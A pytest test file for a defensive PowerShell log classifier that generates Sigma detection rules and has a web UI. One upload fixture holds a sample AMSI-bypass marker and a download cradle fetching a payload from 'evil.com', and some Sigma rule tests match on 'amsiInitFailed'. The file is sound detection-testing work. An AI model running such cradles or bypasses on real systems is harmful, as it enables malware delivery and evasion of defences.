"""
ps_classifier — Sigma + Web UI tests

Run: python -m pytest tests/test_sigma_web.py -v
"""
import sys, uuid
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))

import pytest
from datetime import datetime, timezone
from core.models import Session, ScriptBlock, Finding, TempoClass
from reports.sigma import (generate_sigma_rules, generate_sigma_for_sessions,
                            SigmaRule, SigmaBundle)


# ── Fixtures ──────────────────────────────────────────────────────────────────

def _finding(tech_id, mitre, sev, matched="match"):
    return Finding(tech_id, mitre, sev, "rule", matched, "ctx")

def _block(*findings):
    b = ScriptBlock(str(uuid.uuid4()),"host-01",1234,1,
                    datetime.now(timezone.utc),"","raw","decoded")
    b.findings = list(findings); b.severity = max((f.severity for f in findings), default=0)
    return b

def _session(session_id, *findings, score=80.0, host="host-01"):
    b = _block(*findings)
    return Session(
        session_id=session_id, host_id=host, process_id=1234,
        blocks=[b], weighted_score=score,
        technique_set={f.technique_id for f in findings},
        start_time=datetime.now(timezone.utc),
    )


# ── SigmaRule ─────────────────────────────────────────────────────────────────

def test_sigma_rule_to_yaml_valid():
    rule = SigmaRule(
        rule_id=str(uuid.uuid4()),
        title="Test rule",
        description="A test",
        status="experimental",
        level="high",
        logsource={"product": "windows", "category": "ps_script_block_logging"},
        detection={"sel": {"EventID": 4104, "ScriptBlockText|contains": "amsiInitFailed"},
                   "condition": "sel"},
        tags=["attack.t1562.001"],
        falsepositives=["None"],
        mitre_id="T1562.001",
    )
    yaml_str = rule.to_yaml()
    assert "title:" in yaml_str
    assert "detection:" in yaml_str
    assert "logsource:" in yaml_str
    assert "level: high" in yaml_str
    assert "T1562" in yaml_str


def test_sigma_rule_filename_safe():
    rule = SigmaRule(str(uuid.uuid4()), "Has Spaces & Special!",
                     "d", "experimental", "high",
                     {}, {}, [], [])
    assert " " not in rule.filename
    assert "!" not in rule.filename
    assert rule.filename.endswith(".yml")


def test_sigma_rule_mitre_reference():
    rule = SigmaRule(str(uuid.uuid4()), "T", "D", "experimental", "critical",
                     {}, {}, [], [], mitre_id="T1059.001")
    d = rule.to_dict()
    assert any("T1059" in ref for ref in d.get("references", []))


# ── generate_sigma_rules ──────────────────────────────────────────────────────

def test_generate_sigma_amsi():
    s = _session("s1", _finding("AMSI_BYPASS_REFLECT","T1562.001",90))
    bundle = generate_sigma_rules(s)
    assert len(bundle.rules) == 1
    assert bundle.rules[0].level == "critical"
    assert bundle.rules[0].technique_id == "AMSI_BYPASS_REFLECT"
    assert "amsi" in bundle.rules[0].title.lower()


def test_generate_sigma_multi_technique():
    s = _session("s2",
                 _finding("AMSI_BYPASS_REFLECT","T1562.001",90),
                 _finding("DOWNLOAD_CRADLE_WC","T1105",75),
                 _finding("COBALT_STRIKE","T1059.001",90))
    bundle = generate_sigma_rules(s)
    assert len(bundle.rules) == 3
    levels = {r.level for r in bundle.rules}
    assert "critical" in levels
    assert "high" in levels


def test_generate_sigma_sorted_by_level():
    s = _session("s3",
                 _finding("ENCODED_CMD","T1059.001",50),
                 _finding("AMSI_BYPASS_REFLECT","T1562.001",90))
    bundle = generate_sigma_rules(s)
    # Critical/high should come before medium
    order = {"critical":0,"high":1,"medium":2,"low":3}
    levels = [order[r.level] for r in bundle.rules]
    assert levels == sorted(levels)


def test_generate_sigma_deduplicates_titles():
    """Same technique twice in a session → only one rule."""
    f1 = _finding("AMSI_BYPASS_REFLECT","T1562.001",90,"match1")
    f2 = _finding("AMSI_BYPASS_REFLECT","T1562.001",85,"match2")
    s = _session("s4", f1, f2)
    bundle = generate_sigma_rules(s)
    titles = [r.title for r in bundle.rules]
    assert len(titles) == len(set(titles))


def test_generate_sigma_generic_fallback():
    """Unknown technique_id gets a generic fallback rule."""
    s = _session("s5", _finding("TOTALLY_UNKNOWN_TECH","T9999.001",60,"needle"))
    bundle = generate_sigma_rules(s)
    assert len(bundle.rules) == 1
    assert "TOTALLY_UNKNOWN_TECH".lower() in bundle.rules[0].title.lower() or \
           "needle" in bundle.rules[0].detection.get("selection",{}).get("ScriptBlockText|contains","")


def test_generate_sigma_session_context_in_description():
    """Session host + ID should appear in rule description."""
    s = _session("my-session-999", _finding("REVERSE_SHELL","T1059.001",90),
                 host="CRITICAL-HOST")
    bundle = generate_sigma_rules(s)
    desc = bundle.rules[0].description
    assert "CRITICAL-HOST" in desc or "my-session-999" in desc


def test_generate_sigma_yaml_parseable():
    """All generated rules must produce valid YAML."""
    import yaml
    s = _session("s6",
                 _finding("SHELLCODE_MARSHAL","T1055",95),
                 _finding("WMI_PERSIST","T1546.003",80),
                 _finding("ETW_BYPASS","T1562.006",80))
    bundle = generate_sigma_rules(s)
    for rule in bundle.rules:
        parsed = yaml.safe_load(rule.to_yaml())
        assert isinstance(parsed, dict)
        assert "title" in parsed
        assert "detection" in parsed
        assert "logsource" in parsed


def test_sigma_bundle_highest_level():
    s = _session("s7",
                 _finding("ENCODED_CMD","T1059.001",50),
                 _finding("AV_EXCLUSION","T1562.001",75))
    bundle = generate_sigma_rules(s)
    assert bundle.highest_level in ("critical","high","medium","low")


def test_sigma_bundle_combined_yaml():
    s = _session("s8",
                 _finding("AMSI_BYPASS_REFLECT","T1562.001",90),
                 _finding("DOWNLOAD_CRADLE_WC","T1105",75))
    bundle = generate_sigma_rules(s)
    combined = bundle.to_combined_yaml()
    assert "---" in combined
    assert combined.count("title:") == 2


def test_sigma_bundle_save_dir(tmp_path):
    s = _session("s9", _finding("CRED_HARVEST","T1003.001",90))
    bundle = generate_sigma_rules(s)
    paths = bundle.save_dir(tmp_path)
    assert len(paths) == 1
    assert paths[0].exists()
    content = paths[0].read_text()
    assert "title:" in content


# ── generate_sigma_for_sessions ───────────────────────────────────────────────

def test_multi_session_dedup():
    """Same technique across two sessions → only one rule in the bundle."""
    s1 = _session("sa", _finding("AMSI_BYPASS_REFLECT","T1562.001",90), score=90.0)
    s2 = _session("sb", _finding("AMSI_BYPASS_REFLECT","T1562.001",90), score=85.0,
                  host="host-02")
    combined = generate_sigma_for_sessions([s1, s2])
    techs = [r.technique_id for r in combined.rules]
    assert techs.count("AMSI_BYPASS_REFLECT") == 1


def test_multi_session_skips_low_score():
    """Sessions scoring < 40 should not generate rules."""
    s_low  = _session("sc", _finding("ENCODED_CMD","T1059.001",50), score=20.0)
    s_high = _session("sd", _finding("AMSI_BYPASS_REFLECT","T1562.001",90), score=90.0)
    combined = generate_sigma_for_sessions([s_low, s_high])
    techs = {r.technique_id for r in combined.rules}
    assert "AMSI_BYPASS_REFLECT" in techs


def test_multi_session_all_techniques_covered():
    """Different techniques across sessions should all appear in combined bundle."""
    s1 = _session("se", _finding("REVERSE_SHELL","T1059.001",90), score=90.0)
    s2 = _session("sf", _finding("WMI_PERSIST","T1546.003",80), score=80.0, host="host-02")
    s3 = _session("sg", _finding("COBALT_STRIKE","T1059.001",90), score=90.0, host="host-03")
    combined = generate_sigma_for_sessions([s1, s2, s3])
    techs = {r.technique_id for r in combined.rules}
    assert "REVERSE_SHELL" in techs
    assert "WMI_PERSIST" in techs
    assert "COBALT_STRIKE" in techs


def test_sigma_level_mapping():
    """Severity → Sigma level mapping is correct."""
    cases = [(90, "critical"), (75, "high"), (70, "high"),
             (50, "medium"), (30, "low")]
    from reports.sigma import _sigma_level
    for sev, expected in cases:
        assert _sigma_level(sev) == expected, f"sev={sev} → expected {expected}"


# ── FastAPI / web smoke tests ─────────────────────────────────────────────────

@pytest.fixture
def client():
    from fastapi.testclient import TestClient
    from web.app import app, _state
    _state.update(sessions=[], campaigns=[], ts=None, filename=None)
    return TestClient(app)


def test_web_index_loads(client):
    r = client.get("/")
    assert r.status_code == 200
    assert "ps_classifier" in r.text


def test_web_empty_state(client):
    r = client.get("/")
    assert "No analysis loaded" in r.text or "Upload" in r.text


def test_web_sigma_download_empty(client):
    r = client.get("/sigma/download")
    assert r.status_code == 200
    assert "No rules" in r.text


def test_web_report_download_empty(client):
    r = client.get("/report/download")
    assert r.status_code == 404


def test_web_api_stats_empty(client):
    r = client.get("/api/stats")
    assert r.status_code == 200
    data = r.json()
    assert data["total"] == 0
    assert data["p1"] == 0


def test_web_session_not_found(client):
    r = client.get("/sessions/nonexistent-id")
    assert r.status_code == 404


def test_web_upload_json(client, tmp_path):
    """Upload a synthetic JSON log and verify pipeline runs end-to-end."""
    import json
    event = {
        "EventID": 4104,
        "Computer": "VICTIM-PC",
        "ProcessId": 1234,
        "ThreadId": 1,
        "TimeCreated": "2024-06-01T12:00:00Z",
        "ScriptBlockId": str(uuid.uuid4()),
        "MessageNumber": 1,
        "MessageTotal": 1,
        "ScriptBlockText": "amsiInitFailed; (New-Object Net.WebClient).DownloadString('http://evil.com/payload')",
    }
    json_path = tmp_path / "test.json"
    json_path.write_text(json.dumps([event]))

    with json_path.open("rb") as f:
        r = client.post("/upload", files={"file": ("test.json", f, "application/json")})

    assert r.status_code == 200
    # Should show sessions in the response
    assert "P1" in r.text or "P2" in r.text or "sessions" in r.text.lower()

    # Stats should now be non-zero
    stats_r = client.get("/api/stats")
    stats = stats_r.json()
    assert stats["total"] >= 1


def test_web_sigma_download_after_upload(client, tmp_path):
    """After uploading malicious logs, Sigma download should return rules."""
    import json
    event = {
        "EventID": 4104, "Computer": "HOST", "ProcessId": 100, "ThreadId": 1,
        "TimeCreated": "2024-06-01T12:00:00Z",
        "ScriptBlockId": str(uuid.uuid4()),
        "MessageNumber": 1, "MessageTotal": 1,
        "ScriptBlockText": "amsiInitFailed",
    }
    json_path = tmp_path / "logs.json"
    json_path.write_text(json.dumps([event]))
    with json_path.open("rb") as f:
        client.post("/upload", files={"file": ("logs.json", f, "application/json")})

    r = client.get("/sigma/download")
    assert r.status_code == 200
    assert "title:" in r.text


def test_web_clear_state(client, tmp_path):
    """DELETE /state should reset sessions."""
    import json
    event = {"EventID":4104,"Computer":"H","ProcessId":1,"ThreadId":1,
             "TimeCreated":"2024-01-01T00:00:00Z","ScriptBlockId":str(uuid.uuid4()),
             "MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"amsiInitFailed"}
    p = tmp_path / "l.json"; p.write_text(json.dumps([event]))
    with p.open("rb") as f:
        client.post("/upload", files={"file": ("l.json", f, "application/json")})
    assert client.get("/api/stats").json()["total"] >= 1

    client.delete("/state")
    assert client.get("/api/stats").json()["total"] == 0


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
